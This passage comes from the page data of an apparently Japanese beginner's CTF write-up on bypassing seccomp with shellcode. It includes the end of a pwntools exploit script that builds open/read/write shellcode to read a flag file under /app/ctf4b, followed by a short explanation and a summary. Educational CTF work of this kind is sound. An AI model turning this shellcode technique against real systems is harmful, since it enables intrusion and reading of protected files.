class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nopen_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"/app/ctf4b/</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>file_name<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nread_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token string\">\"rax\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rsp\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span>\nwrite_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rsp\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span>\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>open_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>read_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>write_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n\"\"\"</span></span><span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>shellcode <span class=\"token operator\">+</span> <span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./payload\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Finish exploit</span>\ntarget<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>clean<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 765px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/c87e5077608da42966ac5c8c71449aff/bbb77/image-20240628225954737.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABIklEQVQY05WQyXaDMAxFHRuDmYKdhAyUEKZgp9C0+f+PexXuoptuurhHsoZnSex4K1C7HaZXhX654NqPGN6/0NonmvGB+/Ki2ITOLminGc3gcO3ucPMM5yjetbhP9H5YRFEIxjcBurZHdamRqgiLfcPQHPAYS1xOBkEgCA5JNpSBRwjumznnlAs8QggwxlYY+qFDYTQE+eeUocrIKgb9U/A/IhXi1jbIt1uaMEStE1RaoVISXaRQJDFkGNJEEeI4RpIkULQJ55u/BevbFZZu8fFcMAw9xnHATPcZyXfO+vsYY3A8HbE/7KF1gbIskWUppJQkrugj9bvyp51wOp99Qb7NsdsZajjAkNUklGYZ0jQhKJ9nfsI1l+e597XWnnWDVfAbnmmOgkLF9v8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c87e5077608da42966ac5c8c71449aff/8ac56/image-20240628225954737.webp 240w,\n/static/c87e5077608da42966ac5c8c71449aff/d3be9/image-20240628225954737.webp 480w,\n/static/c87e5077608da42966ac5c8c71449aff/33b41/image-20240628225954737.webp 765w\"\n              sizes=\"(max-width: 765px) 100vw, 765px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c87e5077608da42966ac5c8c71449aff/8ff5a/image-20240628225954737.png 240w,\n/static/c87e5077608da42966ac5c8c71449aff/e85cb/image-20240628225954737.png 480w,\n/static/c87e5077608da42966ac5c8c71449aff/bbb77/image-20240628225954737.png 765w\"\n            sizes=\"(max-width: 765px) 100vw, 765px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c87e5077608da42966ac5c8c71449aff/bbb77/image-20240628225954737.png\"\n            alt=\"image-20240628225954737\"\n            title=\"image-20240628225954737\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>このコードの中では、0x404000 から始まる領域に書き込みと実行権限を付与した後、その領域に埋め込んだ Shell Code で<code class=\"language-text\">/app/ctf4b</code> 配下のファイルの列挙を行います。</p>\n<p>さらに、特定した Flag のファイル名を含む Shell Code をもう一度入力から受け取り、これを実行することで Flag を取得しています。</p>\n<h2 id=\"まとめ\" style=\"position:relative;\"><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\" aria-label=\"まとめ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>まとめ</h2>\n<p>今回は seccomp の回避手法と Shell Code の基礎について学んだことをまとめてみました。</p>\n<p>execve と execveat の制約を回避しつつエクスプロイトを行う解法は他にもありそうなので、今後別の解法も追記していきたいと思います。</p>","fields":{"slug":"/ctf-pwn-gachi-rop","tagSlugs":["/tag/rev/","/tag/pwn/"]},"frontmatter":{"date":"2024-06-28","description":"よちよち CTFer の Pwn 超入門 2 - seccomp の回避と Shell Code の基礎 編-","tags":["Rev","Pwn"],"title":"よちよち CTFer の Pwn 超入門 2 - seccomp の回避と Shell Code の基礎 編-","socialImage":{"publicURL":"/static/9462c8366543bfec55e4deb4c567ebd2/ctf-pwn-gachi-rop.png"}}}},"pageContext":{"slug":"/ctf-pwn-gachi-rop"}},"staticQueryHashes":["251939775","401334301","825871152"]}